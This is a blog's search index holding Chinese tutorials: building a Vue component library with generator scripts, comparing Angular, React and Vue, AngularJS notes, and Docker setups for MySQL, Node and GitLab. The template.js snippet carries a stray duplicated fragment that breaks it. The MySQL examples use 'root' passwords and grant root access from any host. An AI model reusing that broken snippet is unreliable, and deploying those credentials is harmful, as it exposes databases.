<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用 Vue cli 3.0 构建自定义组件库]]></title>
    <url>%2Farchives%2F67d67641.html</url>
    <content type="text"><![CDATA[本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路：包括如何快速并优雅地构建UI库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等前言主流的开源 UI 库代码结构主要分为三大部分：组件库本身的代码：这部分代码会发布到 npm 上预览示例和查看文档的网站代码：类似 Vant、ElementUI 这类网站。配置文件和脚本文件：用于打包和发布等等编写此博文的灵感 UI 框架库（vue-cards）,PS:此 UI 框架库相对于 Vant、ElementUI 会比较简单点，可以作为一份自定义 UI 框架库的入坑 demo，同时这篇博文也是解读这份 UI 框架库的构建到上线的一个过程前置工作以下工作全部基于 Vue CLI 3.x，所以首先要保证机子上有 @vue/clivue create vtp-component # vtp-component 作为教学的库名 vue-router, dart-sass, babel, eslint 这些是该项目使用的依赖项，小主可以根据自己的需求进行相应的切换start开始造轮子了工作目录在根目录下新增四个文件夹，一个用来存放组件的代码（packages）,一个用来存放 预览示例的网站 代码（examples）（这里直接把初始化模板的 src 目录更改为 examples 即可，有需要的话可以将该目录进行清空操作，这里就不做过多的说明），一个用来存放编译脚本代码（build）修改当前的工作目录为以下的格式吗，一个用来存放自定义生成组件和组件的说明文档等脚本（scripts）|--- build | |--- examples | |--- packages | |--- scripts 让 webpack 编译 examples由于我们将 src 目录修改成了 examples，所以在 vue.config.js 中需要进行相应的修改const path = require(&#39;path&#39;) function resolve (dir) { return path.join(__dirname, dir) } module.exports = { productionSourceMap: true, // 修改 src 为 examples pages: { index: { entry: &#39;examples/main.js&#39;, template: &#39;public/index.html&#39;, filename: &#39;index.html&#39; } }, chainWebpack: config =&gt; { config.resolve.alias .set(&#39;@&#39;, resolve(&#39;examples&#39;)) } } 添加编译脚本package.json其中的组件 name 推荐和创建的项目名一致{ &quot;scripts&quot;: { &quot;lib&quot;: &quot;vue-cli-service build --target lib --name vtp-component --dest lib packages/index.js&quot; } } 修改 main 主入口文件{ &quot;main&quot;: &quot;lib/vtp-component.common.js&quot; } 一个组件例子创建组件和组件文档生成脚本在 scripts 中创建以下几个文件，其中 create-comp.js 是用来生成自定义组件目录和自定义组件说明文档脚本，delete-comp.js 是用来删除无用的组件目录和自定义组件说明文档脚本，template.js 是生成代码的模板文件|--- create-comp.js | |--- delete-comp.js | |--- template.js 相关的代码如下，小主可以根据自己的需求进行相应的简单修改，下面的代码参考来源 vue-cli3 项目优化之通过 node 自动生成组件模板 generate View、Componentcreate-comp.js// 创建自定义组件脚本 const chalk = require(&#39;chalk&#39;) const path = require(&#39;path&#39;) const fs = require(&#39;fs-extra&#39;) const uppercamelize = require(&#39;uppercamelcase&#39;) const resolve = (...file) =&gt; path.resolve(__dirname, ...file) const log = message =&gt; console.log(chalk.green(`${message}`)) const successLog = message =&gt; console.log(chalk.blue(`${message}`)) const errorLog = error =&gt; console.log(chalk.red(`${error}`)) const { vueTemplate, entryTemplate, mdDocs } = require(&#39;./template&#39;) const generateFile = (path, data) =&gt; { if (fs.existsSync(path)) { errorLog(`${path}文件已存在`) return } return new Promise((resolve, reject) =&gt; { fs.writeFile(path, data, &#39;utf8&#39;, err =&gt; { if (err) { errorLog(err.message) reject(err) } else { resolve(true) } }) }) } // 这里生成自定义组件 log(&#39;请输入要生成的组件名称,形如 demo 或者 demo-test&#39;) let componentName = &#39;&#39; process.stdin.on(&#39;data&#39;, async chunk =&gt; { let inputName = String(chunk).trim().toString() inputName = uppercamelize(inputName) const componentDirectory = resolve(&#39;../packages&#39;, inputName) const componentVueName = resolve(componentDirectory, `${inputName}.vue`) const entryComponentName = resolve(componentDirectory, &#39;index.js&#39;) const hasComponentDirectory = fs.existsSync(componentDirectory) if (inputName) { // 这里生成组件 if (hasComponentDirectory) { errorLog(`${inputName}组件目录已存在，请重新输入`) return } else { log(`生成 component 目录 ${componentDirectory}`) await dotExistDirectoryCreate(componentDirectory) } try { if (inputName.includes(&#39;/&#39;)) { const inputArr = inputName.split(&#39;/&#39;) componentName = inputArr[inputArr.length - 1] } else { componentName = inputName } log(`生成 vue 文件 ${componentVueName}`) await generateFile(componentVueName, vueTemplate(componentName)) log(`生成 entry 文件 ${entryComponentName}`) await generateFile(entryComponentName, entryTemplate(componentName)) successLog(&#39;生成 component 成功&#39;) } catch (e) { errorLog(e.message) } } else { errorLog(`请重新输入组件名称:`) return } // 这里生成自定义组件说明文档 const docsDirectory = resolve(&#39;../examples/docs&#39;) const docsMdName = resolve(docsDirectory, `${inputName}.md`) try { log(`生成 component 文档 ${docsMdName}`) await generateFile(docsMdName, mdDocs(`${inputName} 组件`)) successLog(&#39;生成 component 文档成功&#39;) } catch (e) { errorLog(e.message) } process.stdin.emit(&#39;end&#39;) }) process.stdin.on(&#39;end&#39;, () =&gt; { log(&#39;exit&#39;) process.exit() }) function dotExistDirectoryCreate (directory) { return new Promise((resolve) =&gt; { mkdirs(directory, function () { resolve(true) }) }) } // 递归创建目录 function mkdirs (directory, callback) { var exists = fs.existsSync(directory) if (exists) { callback() } else { mkdirs(path.dirname(directory), function () { fs.mkdirSync(directory) callback() }) } } delete-comp.js// 删除自定义组件脚本 const chalk = require(&#39;chalk&#39;) const path = require(&#39;path&#39;) const fs = require(&#39;fs-extra&#39;) const uppercamelize = require(&#39;uppercamelcase&#39;) const resolve = (...file) =&gt; path.resolve(__dirname, ...file) const log = message =&gt; console.log(chalk.green(`${message}`)) const successLog = message =&gt; console.log(chalk.blue(`${message}`)) const errorLog = error =&gt; console.log(chalk.red(`${error}`)) log(&#39;请输入要删除的组件名称,形如 demo 或者 demo-test&#39;) process.stdin.on(&#39;data&#39;, async chunk =&gt; { let inputName = String(chunk).trim().toString() inputName = uppercamelize(inputName) const componentDirectory = resolve(&#39;../packages&#39;, inputName) const hasComponentDirectory = fs.existsSync(componentDirectory) const docsDirectory = resolve(&#39;../examples/docs&#39;) const docsMdName = resolve(docsDirectory, `${inputName}.md`) if (inputName) { if (hasComponentDirectory) { log(`删除 component 目录 ${componentDirectory}`) await removePromise(componentDirectory) successLog(`已删除 ${inputName} 组件目录`) log(`删除 component 文档 ${docsMdName}`) fs.unlink(docsMdName) successLog(`已删除 ${inputName} 组件说明文档`) } else { errorLog(`${inputName}组件目录不存在`) return } } else { errorLog(`请重新输入组件名称:`) return } process.stdin.emit(&#39;end&#39;) }) process.stdin.on(&#39;end&#39;, () =&gt; { log(&#39;exit&#39;) process.exit() }) function removePromise (dir) { return new Promise(function (resolve, reject) { // 先读文件夹 fs.stat(dir, function (_err, stat) { if (stat.isDirectory()) { fs.readdir(dir, function (_err, files) { files = files.map(file =&gt; path.join(dir, file)) // a/b a/m files = files.map(file =&gt; removePromise(file)) // 这时候变成了promise Promise.all(files).then(function () { fs.rmdir(dir, resolve) }) }) } else { fs.unlink(dir, resolve) } }) }) } template.jsmodule.exports = { vueTemplate: compoenntName =&gt; { compoenntName = compoenntName.charAt(0).toLowerCase() + compoenntName.slice(1) return `&lt;template&gt; &lt;div class=&quot;vtp-${compoenntName}&quot;&gt; ${compoenntName} &lt;/div&gt; &lt;/template&gt; &lt;script&gt; export default { name: &#39;vtp-${compoenntName}&#39;, data () { return { } }, props: { }, methods: {} } &lt;/script&gt; &lt;style lang=&quot;scss&quot; scope&gt; .vtp-${compoenntName}{} &lt;/style&gt; ` }, entryTemplate: compoenntName =&gt; { return `import ${compoenntName} from &#39;./${compoenntName}&#39; ${compoenntName}.install = function (Vue) { Vue.component(${compoenntName}.name, ${compoenntName}) } export default ${compoenntName} if (typeof window !== &#39;undefined&#39; &amp;&amp; window.Vue) { window.Vue.component(${compoenntName}.name, ${compoenntName}) } ` }, mdDocs: (title) =&gt; { return `# ${title} &lt;!-- {.md} --&gt; --- &lt;!-- {.md} --&gt; ## 如何使用 &lt;!-- {.md} --&gt; ## Attributes &lt;!-- {.md} --&gt; | 参数 | 说明 | 类型 | 可选值 | 默认值 | |-----|-----|-----|-----|-----| | - | - | - | - | - | ` } } ` }, entryTemplate: compoenntName =&gt; { return `import ${compoenntName} from &#39;./${compoenntName}&#39; ${compoenntName}.install = function (Vue) { Vue.component(${compoenntName}.name, ${compoenntName}) } if (typeof window !== &#39;undefined&#39; &amp;&amp; window.Vue) { window.Vue.component(${compoenntName}.name, ${compoenntName}) } ` } } 在 build 中创建以下几个文件，其中 build-entry.js 脚本是用来生成自定义组件导出 packages/index.js， get-components.js 脚本是用来获取 packages 目录下的所有组件|--- build-entry.js | |--- get-components.js 相关的代码如下，小主可以根据自己的需求进行相应的简单修改，下面的代码参考来源 vue-cardsbuild-entry.jsconst fs = require(&#39;fs-extra&#39;) const path = require(&#39;path&#39;) const chalk = require(&#39;chalk&#39;) const uppercamelize = require(&#39;uppercamelcase&#39;) const Components = require(&#39;./get-components&#39;)() const packageJson = require(&#39;../package.json&#39;) const log = message =&gt; console.log(chalk.green(`${message}`)) const version = process.env.VERSION || packageJson.version function buildPackagesEntry () { const uninstallComponents = [] const importList = Components.map( name =&gt; `import ${uppercamelize(name)} from &#39;./${name}&#39;` ) const exportList = Components.map(name =&gt; `${uppercamelize(name)}`) const intallList = exportList.filter( name =&gt; !~uninstallComponents.indexOf(uppercamelize(name)) ) const content = `import &#39;normalize.css&#39; ${importList.join(&#39;\n&#39;)} const version = &#39;${version}&#39; const components = [ ${intallList.join(&#39;,\n &#39;)} ] const install = Vue =&gt; { if (install.installed) return components.map(component =&gt; Vue.component(component.name, component)) } if (typeof window !== &#39;undefined&#39; &amp;&amp; window.Vue) { install(window.Vue) } export { install, version, ${exportList.join(&#39;,\n &#39;)} } export default { install, version, ...components } ` fs.writeFileSync(path.join(__dirname, &#39;../packages/index.js&#39;), content) log(&#39;packages/index.js 文件已更新依赖&#39;) log(&#39;exit&#39;) } buildPackagesEntry() get-components.jsconst fs = require(&#39;fs&#39;) const path = require(&#39;path&#39;) const excludes = [ &#39;index.js&#39;, &#39;theme-chalk&#39;, &#39;mixins&#39;, &#39;utils&#39;, &#39;.DS_Store&#39; ] module.exports = function () { const dirs = fs.readdirSync(path.resolve(__dirname, &#39;../packages&#39;)) return dirs.filter(dirName =&gt; excludes.indexOf(dirName) === -1) } 让 vue 解析 markdown文档中心的 UI 是如何编码的这里不做阐述，小主可以自行参照 vue-cards 中的实现方式进行改造需要安装以下的依赖，让 vue 解析 markdownnpm i markdown-it-container -D npm i markdown-it-decorate -D npm i markdown-it-task-checkbox -D npm i vue-markdown-loader -D 关于 vue.config.js 的配置在 vue-cards 该项目中也有了，不做阐述这里将补充高亮 highlight.js 以及点击复制代码 clipboard 的实现方式安装依赖npm i clipboard highlight.js 改造 App.vue，以下只是列出部分代码，小主可以根据自己的需求进行添加&lt;script&gt; import hljs from &#39;highlight.js&#39; import Clipboard from &#39;clipboard&#39; const highlightCode = () =&gt; { const preEl = document.querySelectorAll(&#39;pre&#39;) preEl.forEach((el, index) =&gt; { hljs.highlightBlock(el) const lang = el.children[0].className.split(&#39; &#39;)[1].split(&#39;-&#39;)[1] const pre = el const span = document.createElement(&#39;span&#39;) span.setAttribute(&#39;class&#39;, &#39;code-copy&#39;) span.setAttribute(&#39;data-clipboard-snippet&#39;, &#39;&#39;) span.innerHTML = `${lang.toUpperCase()} | COPY` pre.appendChild(span) }) } export default { name: &#39;App&#39;, mounted () { if (&#39;onhashchange&#39; in window) { window.onhashchange = function (ev) { let name = window.location.hash.substring(2) router.push({ name }) } } highlightCode() let clipboard = new Clipboard(&#39;.code-copy&#39;, { text: (trigger) =&gt; { return trigger.previousSibling.innerText } }) // 复制成功执行的回调 clipboard.on(&#39;success&#39;, (e) =&gt; { e.trigger.innerHTML = `已复制` }) }, updated () { highlightCode() } } &lt;/script&gt; 生成命令在 package.json 中添加以下内容，使用命令 yarn new:comp 创建组件目录及其文档或者使用命令 yarn del:comp 即可删除组件目录及其文档{ &quot;scripts&quot;: { &quot;new:comp&quot;: &quot;node scripts/create-comp.js &amp;&amp; node build/build-entry.js&quot;, &quot;del:comp&quot;: &quot;node scripts/delete-comp.js &amp;&amp; node build/build-entry.js&quot; } } changelog在 package.json 中修改 script 字段，接下来你懂的，另一篇博客有介绍哦，小主可以执行搜索{ &quot;scripts&quot;: { &quot;init&quot;: &quot;npm install commitizen -g &amp;&amp; commitizen init cz-conventional-changelog --save-dev --save-exact &amp;&amp; npm run bootstrap&quot;, &quot;bootstrap&quot;: &quot;npm install&quot;, &quot;changelog&quot;: &quot;conventional-changelog -p angular -i CHANGELOG.md -s -r 0&quot; } }]]></content>
      <categories>
        <category>vuejs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
        <tag>Component</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈谈 WEB 前端主流的三大框架]]></title>
    <url>%2Farchives%2F65cc14e3.html</url>
    <content type="text"><![CDATA[讲到前端的框架,大家想必都能脱口而出：Angular、React、Vue,那么这几个框架的优缺点,以及在项目当中如何抉择框架的使用等等,本篇就将介绍这三大框架的使用感受双向绑定开篇就用这三大框架的双向绑定的实现作为一个 demo 引入,通过这三大框架的双向绑定能够简单的了解三大框架在编码上的一些区别以及其的简易程度,从下面的代码简洁程度来讲,vue.js 给我们带来的体验还是不错的Angular特点基于 MVVM 开发模式Dependency Injection（依赖注入）TypeScript模块化&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body ng-app=&quot;MyModule&quot;&gt; &lt;div ng-controller=&quot;MyCtrl&quot;&gt; &lt;input type=&quot;text&quot; ng-model=&quot;message&quot;&gt; &lt;h1&gt;{{ message }}&lt;/h1&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.bootcss.com/angular.js/1.7.8/angular.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 这边使用到的是推断型依赖注入 const MyModule = angular.module(&quot;MyModule&quot;, []) const MyCtrl = function ($scope) { $scope.message = &#39;Hello world !!!&#39; } MyModule.controller(&#39;MyCtrl&#39;, MyCtrl) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; React特点Virtual DOM声明式设计高效、灵活JSX组件化单向响应的数据流&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;root&quot;&gt;&lt;/div&gt; &lt;script src=&quot;https://cdn.bootcss.com/react/16.9.0-alpha.0/umd/react.development.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;https://cdn.bootcss.com/react-dom/16.8.6/umd/react-dom.development.js&quot;&gt;&lt;/script&gt; &lt;!-- 注意这边的 babel 只能用 5.x 以下版本的 --&gt; &lt;script src=&quot;https://cdn.bootcss.com/babel-core/5.8.38/browser.min.js&quot;&gt;&lt;/script&gt; &lt;script type=&quot;text/babel&quot;&gt; // 这边使用到的是 JSX 语法,React 内部并没有实现双向绑定,所以这边使用了 input 的 change 事件来实现双向绑定 class Input extends React.Component { constructor(props) { super(props) this.state = { message: &#39;Hello world !!!&#39; } this.handleChange = this.handleChange.bind(this) } handleChange(event) { this.setState({ message: event.target.value }); } render() { var message = this.state.message; return ( &lt;div&gt; &lt;input type = &quot;text&quot; value = { message } onChange = { this.handleChange } /&gt; &lt;h1&gt; { message } &lt;/h1&gt; &lt;/div&gt; ); } } ReactDOM.render(&lt;Input/&gt;, document.getElementById(&#39;root&#39;)); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; Vue特点基于 MVVM 开发模式渐进式数据驱动友好组件化轻量简洁快速模块化友好&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=&quot;app&quot;&gt; &lt;input type=&quot;text&quot; v-model=&quot;message&quot;&gt; &lt;h1&gt;{{ message }}&lt;/h1&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.bootcss.com/vue/2.6.10/vue.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue({ el: &#39;#app&#39;, data() { return { message: &#39;Hello world !!!&#39; } } }) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; Startspackagestartsforksissuescreatedversiondownloadssizeangular47.2k12.6k2k+Jan 6, 2010react127k23k400+May 25, 2013vue136k19.3k190+Jul 29, 2013npm 下载趋势npm chartsVue 与 Angular.js 的区别相同点都支持指令、内置指令和自定义指令都支持过滤器、内置过滤器和自动一过滤器都支持双向绑定都支持双向数据绑定都不支持低端浏览器不同点Angular.js 的学习成本比 Vue.js 高，比如增加了 Dependency Injection（依赖注入） 特性，而 Vue.js 本身提供的 API 都比较简单、直观；而最新版的 Angular.js 直接采用 TypeScript 编写，Vue.js 3.x 版本虽然源码是采用 TypeScript 编写，但是实际项目中可以不用 TypeScript，即是一个渐进式框架在性能上，Angular.js 依赖对数据做 脏检查，所以 Watcher 越多越慢。Vue.js 使用基于依赖追踪的观察并且使用异步队列更新，所以的数据都是独立触发的Vue 与 React 的区别相同点react 采用特殊的 JSX 语法，Vue.js 在组件开发中也推崇编写 .vue 特殊文件格式，对文件内容都有一定的约定，两者都需要编译后使用中心思想：一切都是组件，组件实例之间可以互相嵌套都提供合理的钩子函数，可以让开发者定制化的去处理需求都不内置函数 AJAX，Route等功能和到和行包，而是以插件的方式加载在组件开发中都支持 mixins 的特性不同点React 依赖 Virtual DOM，而 Vue.js 使用的是 DOM 模板。React 采用 Virtual DOM 会对渲染出来的结果做 脏检查React 不支持双向绑定（需要自己编写相关的 change 函数）Vue.js 在模板中提供了指令、过滤器等，可以非常方便，快捷的操作 DOM]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Vue.js</tag>
        <tag>React.js</tag>
        <tag>Angular.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Angularjs 学习笔记]]></title>
    <url>%2Farchives%2F6daa0d06.html</url>
    <content type="text"><![CDATA[Angularjs 1.0 的学习笔记依赖注入&lt;!DOCTYPE html&gt; &lt;html ng-app=&quot;MyModule&quot;&gt; &lt;head&gt; &lt;title&gt;最基本的依赖注入方式&lt;/title&gt; &lt;meta charset=&quot;utf-8&quot;/&gt; &lt;script src=&quot;../Script/angular.min.js&quot; type=&quot;text/javascript&quot;&gt;&lt;/script&gt; &lt;script src=&quot;base.js&quot;&gt;&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../bootstrap-3.0.0/css/bootstrap.css&quot;&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt; &lt;div ng-controller=&quot;MyCtrl&quot; style=&quot;text-align: c&quot;&gt; &lt;span style=&quot;font-size: 20px;&quot;&gt;{{gameName}}&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 内联式注入//最基本的依赖注入方式 var MyModule = angular.module(&quot;MyModule&quot;,[]) MyModule.controller(&#39;MyCtrl&#39;,[&#39;$scope&#39;, function($scope){ //可以修改参数,如$scope1,但下面必须同时改 $scope.gameName = &quot;hello&quot; } ]); 推断型注入//推断型注入方式:函数参数的名称必须要和被注入的对象相同 var MyModule = angular.module(&quot;MyModule&quot;,[]) var MyCtrl = function($scope){ $scope.gameName = &quot;hello&quot; } MyModule.controller(&#39;MyCtrl&#39;,MyCtrl) 声明式注入//声明式注入 var MyModule = angular.module(&quot;MyModule&quot;,[]) var MyCtrl = function(thisISMyName){ //参数名称可以随意变化 thisISMyName.gameName = &quot;hello&quot; } MyCtrl.$inject = [&#39;$scope&#39;] //加载模块 MyModule.controller(&#39;MyCtrl&#39;,MyCtrl) 双向绑定&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body ng-app=&quot;MyModule&quot;&gt; &lt;div ng-controller=&quot;MyCtrl&quot;&gt; &lt;input type=&quot;text&quot; ng-model=&quot;message&quot;&gt; &lt;h1&gt;{{ message }}&lt;/h1&gt; &lt;/div&gt; &lt;script src=&quot;https://cdn.bootcss.com/angular.js/1.7.8/angular.min.js&quot;&gt;&lt;/script&gt; &lt;script&gt; // 这边使用到的是推断型依赖注入 const MyModule = angular.module(&quot;MyModule&quot;, []) const MyCtrl = function ($scope) { $scope.message = &#39;Hello world !!!&#39; } MyModule.controller(&#39;MyCtrl&#39;, MyCtrl) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;]]></content>
      <categories>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
        <tag>Angularjs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker 使用指南]]></title>
    <url>%2Farchives%2F693996ef.html</url>
    <content type="text"><![CDATA[Docker 是一个开源的应用容器引擎,基于 Go 语言 并遵从Apache2.0协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中,然后发布到任何流行的 Linux 机器上,也可以实现虚拟化为什么要用Docker？在没有docker之前,如果我们要在windows上安装mysql、mongodb需要先下载这些软件,然后还要一步步点设置,并且注册到windows服务。并且根本不知道安装到什么地方（某些版本mysql不能指定安装位置,默认到C盘）。同时也会在控制面板内注册许多相关的插件。以后要卸载的时候可能还会有各种残留。作为一个强迫症患者这是万万不能忍受的。 现在有了docker,只需要一行代码就能拉取所需软件的镜像,然后配置一个容器就启动了。需要开发的时候就打开docker,服务便能够运行。占用的空间也小,性能和原生差异不大。增删查改都只需要一行代码就能完成。卸载起来也毫无残留。更重要的是,我可以同时有一个镜像的几个容器。即使我搞坏了一个,也可以用其他的容器。还能随时监测这些容器的磁盘占用等状态docker 文档这里只找到了英文的文档,所以英文不好的慎阅 官方 docker 文档 非官方 docker 整理文档常用的 docker 命令docker pull [image_name]:[version] # 下载镜像 docker run -it [docker_id] bash # 运行一个容器实例 docker ps # 查看当前运行的 docker 容器的进程信息 docker-compose ps # 查看当前的使用 docker-compose up -d 开启的容器进程信息 docker-compose up -d # 使用本地的 docker-compose.yml 开启相关的容器 docker-compose down # 终止当前的使用 docker-compose up -d 开启的容器 docker images # 查看本地的所有 docker 镜像 docker image rm [docker_image_id] # 删除本地的 docker 镜像 docker rmi -f [docker_image_id] # 删除本地的 docker 镜像 在你的机子上安装服务至于一些 docker 镜像下载加速或者其他的知识自行查阅文档,这里只收集 docker 安装各种服务的方法Ubuntu$ docker pull ubuntu $ docker run -it ubuntu bash MySQL通过镜像# 搜索mysql的镜像信息 $ docker search mysql # 从仓库拉取mysql,mysql:tag 后面可以跟标签得到指定版本,不加默认为lastest $ docker pull mysql $ docker run --name test-mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -d mysql:5.6 $ docker run --name test-phpmyadmin -p 8080:80 --link test-mysql:db -d phpmyadmin/phpmyadmin:latest 通过 docker-compose.ymlversion: &quot;3&quot; services: mysql: image: mysql:5.6 container_name: test-mysql restart: always ports: - &quot;3306:3306&quot; environment: MYSQL_USER: &quot;root&quot; MYSQL_PASSWORD: &quot;root&quot; MYSQL_ROOT_PASSWORD: &quot;root&quot; volumes: - ./mysql:/var/lib/mysql networks: - net-mysql phpmyadmin: image: phpmyadmin/phpmyadmin:latest container_name: test-phpmyadmin ports: - &quot;7777:80&quot; environment: MYSQL_USER: &quot;root&quot; MYSQL_PASSWORD: &quot;root&quot; MYSQL_ROOT_PASSWORD: &quot;root&quot; PMA_HOST: test-mysql networks: - net-mysql networks: net-mysql: docker-compose.yml 同级目录下执行：docker-compose up -d 之后在浏览器访问 http://127.0.0.1:7777 即可如果无法正常登录的话,使用 docker exec -it [dockerId] bash 进入 MySQL 容器并登陆 MySQL 执行以下命令mysql&gt; grant all privileges on *.* to &#39;root&#39;@&#39;%&#39;; mysql&gt; flush privileges; Node + Vue在项目文件夹下创建 dockerfileFROM node:latest # 设置时区 RUN sh -c &quot;echo &#39;Asia/Shanghai&#39; &gt; /etc/timezone&quot; &amp;&amp; \ dpkg-reconfigure -f noninteractive tzdata # 使用阿里云的Ubuntu镜像 RUN echo &#39;\n\ deb http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n\ deb http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n\ deb http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n\ deb http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n\ deb http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n\ deb-src http://mirrors.aliyun.com/ubuntu/ trusty main restricted universe multiverse\n\ deb-src http://mirrors.aliyun.com/ubuntu/ trusty-security main restricted universe multiverse\n\ deb-src http://mirrors.aliyun.com/ubuntu/ trusty-updates main restricted universe multiverse\n\ deb-src http://mirrors.aliyun.com/ubuntu/ trusty-proposed main restricted universe multiverse\n\ deb-src http://mirrors.aliyun.com/ubuntu/ trusty-backports main restricted universe multiverse\n&#39;\ &gt; /etc/apt/sources.list RUN apt-get update \ &amp;&amp; apt-get install -y \ # node-sass 等编译依赖 make gcc g++ build-essential python2.7 \ # 命令行工具 curl wget vim git git-flow yarn xsel # 切换 node 的软件版本源 =&gt; 切源工具 cgr 和 nrm # cgr 是基于nrm的改进版本,进行了一些优化,能同时管理 npm、yarn 源 # cgr use taobao n =&gt; 只是切换 npm 源 # cgr use taobao y =&gt; 只是切换 yarn 源 RUN true \ &amp;&amp; npm install -g cgr nrm \ &amp;&amp; cgr use taobao \ &amp;&amp; npm i -g serve @vue/cli @vue/cli-service-global \ commitizen conventional-changelog-cli eslint-plugin-vue \ npm-check-updates npx # 创建工作目录 RUN mkdir /workspace WORKDIR /workspace # 添加权限,755 或者 a+x RUN chmod -R 755 /workspace VOLUME /workspace EXPOSE 8080 EXPOSE 5000 在项目文件夹下创建 docker-compose.ymlversion: &#39;3&#39; services: dev: image: vueimage:1.0 ports: - &quot;8080:8080&quot; # 映射端口,将本机的 8080 端口映射到 docker 的 8080 端口,npm run serve restart: always # 每次开启 docker 的时候重启服务,适用于 MySQL、nginx 类似于这种的服务 volumes: - ./:/workspace # 将执行命令的目录映射到 docker 容器的 /workspace 目录 stdin_open: true # 命令行输入映射,不进行设置会导致无法正常进入 docker tty: true # 使用TTY模式（pseudo-TTY）。若要使用bash,则必须设置该选项。若不设置该选项,则可以输入命令,但不显示shell web: image: vueimage:1.0 ports: - &quot;5000:5000&quot; # 映射端口,将本机的 5000 端口映射到 docker 的 5000 端口,npm run build &amp;&amp; serve dist\ restart: always # 每次开启 docker 的时候重启服务,适用于 MySQL、nginx 类似于这种的服务 volumes: - ./:/workspace # 将执行命令的目录映射到 docker 容器的 /workspace 目录 stdin_open: true # 命令行输入映射,不进行设置会导致无法正常进入 docker tty: true # 使用TTY模式（pseudo-TTY）。若要使用bash,则必须设置该选项。若不设置该选项,则可以输入命令,但不显示shell 在项目文件夹下执行(编译一个镜像容器出来)docker build -t vueimage:1.0 . 编译完成之后执行,用以启动容器docker-compose up -d 使用 docker ps 查看 容器的 id,之后使用以下命令进入容器docker exec -it [docker_id] zsh 确认当前目录已经挂载了当前的项目目录,使用 pwd 确认当前的目录为 /workspace,执行安装依赖命令并且启动服务yarn install yarn serve 服务启动之后就在浏览器中访问 http://127.0.0.1:8080经过上面的配置,我们就可以在主机上使用喜欢的编辑器编辑代码,通过docker执行。但是使用 yarn serve 命令进行开发时,会发现一个问题：在编辑器中编辑文件后,docker无法监听到文件的修改,从而重新编译、刷新页面；我们可以采用 webpack 的轮询功能解决：关于 webpack 的轮询功能 =&gt; webpackvue.config.jsmodule.exports = { devServer: { watchOptions: { aggregateTimeout: 300, // 当第一个文件更改,会在重新构建前增加延迟。这个选项允许 webpack 将这段时间内进行的任何其他更改都聚合到一次重新构建里。以毫秒为单位： poll: 1000 // 通过传递 true 开启 polling,或者指定毫秒为单位进行轮询。 } } } 到此已经全部配置完毕,重新 yarn serve 然后就可以愉快的写代码了gitlab英文官方原版在项目文件夹下创建 docker-compose.ymlversion: &#39;3&#39; services: gitlab: container_name: gitlab image: gitlab/gitlab-ce restart: always environment: GITLAB_OMNIBUS_CONFIG: | # external_url &#39;http://gitlab.example.com:9090&#39; ports: - &#39;80:80&#39; - &#39;443:443&#39; - &#39;2224:22&#39; volumes: - ./en/config:/etc/gitlab - ./en/logs:/var/log/gitlab - ./en/data:/var/opt/gitlab 中文社区版在项目文件夹下创建 docker-compose.ymlversion: &#39;3&#39; services: gitlab: container_name: gitlab image: twang2218/gitlab-ce-zh restart: always hostname: &#39;gitlab&#39; environment: TZ: &#39;Asia/Shanghai&#39; 